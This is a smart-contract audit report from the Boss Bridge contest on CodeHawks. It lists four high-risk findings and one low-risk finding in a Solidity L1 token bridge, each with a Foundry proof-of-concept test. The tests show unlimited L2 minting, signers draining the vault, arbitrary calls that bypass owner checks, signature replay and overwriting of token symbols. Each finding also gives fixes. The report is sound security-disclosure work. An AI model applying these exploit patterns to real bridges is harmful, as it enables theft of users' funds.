# First Flight #4: Boss Bridge - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
  - ### [H-01. Infinite Token Creation on L2 in L1BossBridge](#H-01)
  - ### [H-02. Signers can steal all the token with `withdrawTokensToL1` in L1BossBridge](#H-02)
  - ### [H-03. Signers can craft message steal funds and bypass Ownable security](#H-03)
  - ### [H-04. Replay possible in `sendToL1` in L1BossBridge](#H-04)
- ## Low Risk Findings
  - ### [L-01. No check of existing symbol in TokenFactory](#L-01)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #4

### Dates: Nov 9th, 2023 - Nov 15th, 2023

[See more contest details here](https://www.codehawks.com/contests/clomptuvr0001ie09bzfp4nqw)

# <a id='results-summary'></a>Results Summary

### Number of validated findings:

- High: 4
- Medium: 0
- Low: 1

# High Risk Findings

## <a id='H-01'></a>H-01. Infinite Token Creation on L2 in L1BossBridge

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L70C1-L78C6

## Summary

The `depositTokensToL2` function in the smart contract allows an attacker to create an infinite number of tokens on the L2 network by exploiting the event emission mechanism. By manipulating the `from` address and emitting the `Deposit` event multiple times, the attacker can mint an unlimited amount of tokens on the L2 network.

## Vulnerability Details

The vulnerability arises from the fact that the `depositTokensToL2` function does not perform proper checks on the `from` address. An attacker can pass the address of the vault as the `from` parameter and emit the `Deposit` event multiple times, causing the L2 contract to mint tokens for the attacker. This can lead to an infinite supply of tokens for the attacker on the L2 network.

Foundry (put in test file) PoC:

```
function testCreateInfiniteL2TokenPoC() public {
        // user send money to the bridge
        testUserCanDepositTokens();

        // withdraw to the operator address (steal user's money)
        vm.startPrank(attacker);

        // Create infinite event (and token on L2 for the attacker)
        for (uint i; i < 3; i++) {
            vm.expectEmit(address(tokenBridge));
            emit Deposit(address(vault), attackerInL2, 10e18);
            tokenBridge.depositTokensToL2(address(vault), attackerInL2, 10e18);
        }

        vm.stopPrank();
    }
```

## Impact

By exploiting this vulnerability, an attacker can create an unlimited number of tokens on the L2 network, potentially leading to inflation and devaluation of the token. This can result in financial loss and undermine the integrity of the token system.

## Tools Used

Manual review

## Recommendations

To mitigate this vulnerability, it is recommended to remove the `from` parameter in `depositTokensToL2` function. Use instead `msg.sender` in all places `from` argument is used.

## <a id='H-02'></a>H-02. Signers can steal all the token with `withdrawTokensToL1` in L1BossBridge

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L91C1-L125C6

## Summary

The `withdrawTokensToL1` function in the smart contract allows any signer to withdraw tokens from the vault to a specified address. This can lead to unauthorized withdrawal of tokens by malicious signers.

## Vulnerability Details

The vulnerability lies in the `withdrawTokensToL1` where the `abi.encodeCall` is used to construct a call to the `transferFrom` function of the `token` contract. However, the `transferFrom` call is made with the `vault` as the `from` address, and an arbitrary`to` address specified by the signer. This allows any signer to transfer tokens to an address of their choice, potentially stealing the user's tokens.

Foundry (put in test file) PoC :

```
function testSignersStealTheVaultPoC() public {
        // user send money to the bridge
        testUserCanDepositTokens();

        // withdraw to the operator address (steal user's money)
        vm.startPrank(operator.addr);
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
            _getTokenWithdrawalMessage(operator.addr, 10e18),
            operator.key
        );
        tokenBridge.withdrawTokensToL1(operator.addr, 10e18, v, r, s);

        // Check the success of the steal
        assertEq(token.balanceOf(operator.addr), 10e18);

        // Give back money because we are white hats, not sneaky thief.

        token.transfer(address(vault), 10e18);
        assertEq(token.balanceOf(operator.addr), 0);
        vm.stopPrank();
    }
```

## Impact

Loss of all funds : Any signers who sign a withdrawal to their accounts can steal all the money

## Tools Used

Manual review

## Recommendations

To fix this vulnerability, the `withdrawTokensToL1` function should be modified to define, thanks to blockchain automation (and oracles), the `to` parameter without the need of a signer or any other user. This will ensure that tokens are transferred from the vault to the user who ask for a withdraw, preventing unauthorized withdrawals.

## <a id='H-03'></a>H-03. Signers can craft message steal funds and bypass Ownable security

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L119C1-L121C61

## Summary

The `sendToL1` function in the smart contract allows any signer to execute arbitrary functions in the vault contract by passing a message. This poses a security risk as signers can bypass the necessary checks and perform unauthorized actions.

## Vulnerability Details

The vulnerability lies in the `sendToL1` function where it allows signers to execute arbitrary function. The message passed to the function contains the target contract address, the value to send, and the data to execute. This allows signers to call any function in any contract with `msg.sender == address(instanceOfL1BossBridge`, and so bypass functions that should only be accessible to this contract. But also craft a withdraw message the money of the vault.

Foundry (put in test file) PoC :

```
function testSignerCanBypassVaultApprovalPoC() public {
        // setup attacker account
        vm.prank(deployer);
        token.transfer(address(attacker), 1000e18);

        // user send money to the bridge
        testUserCanDepositTokens();

        // Exemple of using the vault approveTo function bypassing of the owner check
        // to steal all the vault
        bytes memory message_sent_by_signer = abi.encode(
            address(vault),
            0,
            abi.encodeCall(L1Vault.approveTo, (attacker, UINT256_MAX))
        );

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
            message_sent_by_signer,
            operator.key
        );
        // withdraw to the operator address (steal user's money)
        vm.prank(operator.addr);
        tokenBridge.sendToL1(v, r, s, message_sent_by_signer);

        vm.startPrank(attacker);
        token.transferFrom(address(vault), attacker, 10e18);

        // Check the success of the steal
        assertEq(token.balanceOf(attacker), 1010e18);

        // Give back money because we are white hats, not sneaky thief.

        token.transfer(address(vault), 10e18);
        assertEq(token.balanceOf(attacker), 1000e18);
        vm.stopPrank();
    }
```

## Impact

This vulnerability allows signers to bypass the necessary checks and execute unauthorized actions in the vault contract. For example, an attacker can use this vulnerability to call the `approveTo` function in the vault contract, bypassing the owner check and permit (by phishing, threatening, etc) stealing all the vault's funds.

Moreover, the signer can use the same message crafted in the `withdrawToL1` to steal all the token.
This vulnerability is explicated in my other submission.

## Tools Used

Manual review

## Recommendations

To mitigate this vulnerability, it is recommended to implement proper access control mechanisms in the `sendToL1` function. The function should only allow signers to execute specific functions that are deemed safe and necessary for the intended functionality of the smart contract (here: withdraw). Additionally, it is important to thoroughly review the permissions and roles assigned to signers to ensure that only authorized actions can be performed.

## <a id='H-04'></a>H-04. Replay possible in `sendToL1` in L1BossBridge

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1BossBridge.sol#L115C8-L117C10

## Summary

The `sendToL1` function in the provided code does not validate if the `msg.sender` is the actual signer of the message. This allows any user to potentially steal funds by re-sending a previously signed message.

## Vulnerability Details

The `sendToL1` function first recovers the signer's address from the provided signature and then proceeds with the execution of the transaction. However, it does not check if the `msg.sender` (the caller of the function) matches the recovered signer's address. This means that any user can impersonate the signer by re-sending a previously signed message and steal funds from the contract.

Concrete example : An attacker can send Token on the vault, ask for a withdraw, and replay infinitely this withdraw to steal all tokens.

Foundry (in test file) PoC:

```
function testStealSendToL1PoC() public {
        // setup attacker account
        vm.prank(deployer);
        token.transfer(address(attacker), 1000e18);

        // innocent user send money to the bridge
        testUserCanDepositTokens();

        // attacker send money (to ask a withdraw an get a signature from the signer)
        vm.startPrank(attacker);
        uint256 amount = 10e18;
        token.approve(address(tokenBridge), amount);
        tokenBridge.depositTokensToL2(attacker, attackerInL2, amount);

        // Check vault has the token from user and attacker
        assertEq(token.balanceOf(address(tokenBridge)), 0);
        assertEq(token.balanceOf(address(vault)), amount * 2);
        vm.stopPrank();

        // withdraw once to the attacker address thanks to one signer. (legitimate)
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
            _getTokenWithdrawalMessage(attacker, amount),
            operator.key
        );

        vm.prank(operator.addr);
        tokenBridge.withdrawTokensToL1(attacker, amount, v, r, s);

        // The attacker can access v, r, s and even the message sent
        // (or deduce it thanks to the source code) in any block explorer
        // and reuse it like that to steal money remaining in the vault

        bytes memory message_sent_by_signer = abi.encode(
            address(token),
            0,
            abi.encodeCall(
                IERC20.transferFrom,
                (address(vault), attacker, amount)
            )
        );

        // use same argument but sent by the hacker (NOT legitimate)
        vm.startPrank(attacker);
        tokenBridge.sendToL1(v, r, s, message_sent_by_signer);

        // Check the success of the steal (return of the initial balance + amount stolen)
        assertEq(token.balanceOf(attacker), 1000e18 + amount);

        // Give back money because we are white hats, not sneaky thief.

        token.transfer(address(vault), amount);
        assertEq(token.balanceOf(attacker), 1000e18);
        vm.stopPrank();
    }
```

## Impact

This vulnerability allows any user to steal funds by replaying a previously signed withdraw transaction. The potential impacts include:

- Unauthorized fund transfers: An attacker can resend a previously signed message, tricking the contract into executing the transaction and transferring funds to their desired target address.
- Financial loss: Users who expect their transactions to be secure may fall victim to unauthorized fund transfers, resulting in financial losses.

## Tools Used

Manual review

## Recommendations

To mitigate this vulnerability, it is crucial to validate that the `msg.sender` matches the actual signer of the message. This can be done by comparing the recovered signer's address with `msg.sender` before executing the transaction. If they do not match, the function should revert and reject the transaction.

Here is an updated version of the `sendToL1` function with the signer validation:

```solidity
function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
    address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);

    require(signer == msg.sender, "Invalid signer");

    // Rest of the function code...
}
```

# Low Risk Findings

## <a id='L-01'></a>L-01. No check of existing symbol in TokenFactory

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/TokenFactory.sol#L27

## Summary

The `deployToken` function in the provided code does not check if a symbol already exists before assigning a new address to it. This allows a malicious/absent-minded owner to replace the address associated with a symbol.

## Vulnerability Details

The `deployToken` function is called to create a new token with a given symbol and bytecode. However, the function does not perform any validation to ensure that the symbol is unique. As a result, a malicious owner can call the `deployToken` function multiple times with the same symbol and different bytecode, effectively replacing the address associated with the symbol.

Foundry PoC (in test file) :

```
    function testOverrideTokenAddress() public {
        // create a first token
        vm.prank(owner);
        address tokenAddress = tokenFactory.deployToken(
            "TEST",
            type(L1Token).creationCode
        );
        assertEq(tokenFactory.getTokenAddressFromSymbol("TEST"), tokenAddress);

        // use the same symbol but with another address
        vm.prank(owner);
        address newTokenAddress = tokenFactory.deployToken(
            "TEST",
            type(L1Token).creationCode
        );

        // check that new address is not the same than the old one
        assertFalse(newTokenAddress == tokenAddress);

       // check that new address replaced the previous one.
        assertEq(
            tokenFactory.getTokenAddressFromSymbol("TEST"),
            newTokenAddress
        );
    }
```

## Impact

This vulnerability allows a malicious/absent-minded owner to override the address associated with a token symbol. This can have various consequences, such as:

- Changing the behavior of existing contract interacting with the TokenFactory to find contract address.
- Confusing users and causing financial losses.
- Cannot put again in the mapping the replaced contract.

## Tools Used

Manual review

## Recommendations

To mitigate this vulnerability, the `deployToken` function should include a check to ensure that the symbol does not already exist before assigning a new address to it. Example : `require(s_tokenToAddress[symbol] == address(0))`
